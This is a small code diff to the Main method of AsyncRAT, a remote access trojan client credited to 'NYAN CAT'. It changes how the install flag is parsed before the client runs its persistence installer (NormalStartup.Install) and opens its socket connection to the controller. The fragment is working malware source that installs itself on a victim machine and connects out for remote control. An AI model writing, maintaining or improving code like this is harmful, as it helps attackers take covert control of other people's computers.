@@ -1,6 +1,7 @@
 ﻿using System.Threading;
 using Client.Sockets;
 using Client.Install;
+using System;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : AsyncRAT // Simple Socket
@@ -18,7 +19,7 @@ namespace Client
 
         static void Main()
         {
-            if (Settings.Install == "true")
+            if (Convert.ToBoolean(Settings.Install))
                 NormalStartup.Install();
 
             ClientSocket.InitializeClient();
